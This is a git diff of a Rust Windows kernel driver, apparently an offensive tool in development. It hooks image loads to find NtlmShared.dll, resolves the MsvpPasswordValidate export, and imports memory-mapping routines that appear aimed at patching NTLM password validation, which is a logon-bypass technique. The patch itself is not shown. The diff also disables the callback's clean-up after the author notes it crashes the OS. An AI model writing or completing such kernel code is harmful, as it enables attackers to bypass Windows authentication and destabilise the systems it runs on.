@@ -7,6 +7,7 @@ mod include;
 use core::panic::PanicInfo;
 
 extern crate alloc;
+use alloc::ffi::CString;
 use core::ptr;
 use include::{
     ntddk::{IoAllocateMdl, MmMapLockedPagesSpecifyCache, MmProbeAndLockPages, MmUnmapLockedPages},
@@ -133,21 +134,19 @@ pub unsafe extern "C" fn load_image_callback(
     {
         let target_base = (*image_info).ImageBase;
         log::info!("[+] Found NtlmShared.dll at address {:?}", target_base);
-        // TODO: Implement get_export function
-        // let msvp_password_validate = get_export(
-        //     target_base,
-        //     CStr::from_ptr("MsvpPasswordValidate".as_ptr() as _),
-        // )
-        // .expect("[-] Failed to find MsvpPasswordValidate export");
-        // log::info!(
-        //     "[+] MsvpPasswordValidate at address {:?}",
-        //     msvp_password_validate
-        // );
+        let msvp_password_validate =
+            common::get_export(target_base, &CString::new("MsvpPasswordValidate").unwrap())
+                .expect("Failed to find MsvpPasswordValidate export");
+        log::info!(
+            "[+] MsvpPasswordValidate at address {:?}",
+            msvp_password_validate
+        );
 
         // Clean-up the load image callback
-        match PsRemoveLoadImageNotifyRoutine(load_image_callback as LOAD_IMAGE_NOTIFY_ROUTINE) {
-            STATUS_SUCCESS => log::info!("[*] Unregistered load image callback. Goodbye!"),
-            _ => log::error!("[-] Failed to unregister load image callback"),
-        }
+        // TODO: This crashes the OS... although it didn't before?
+        // match PsRemoveLoadImageNotifyRoutine(load_image_callback as LOAD_IMAGE_NOTIFY_ROUTINE) {
+        //     STATUS_SUCCESS => log::info!("[*] Unregistered load image callback. Goodbye!"),
+        //     _ => log::error!("[-] Failed to unregister load image callback"),
+        // }
     }
 }
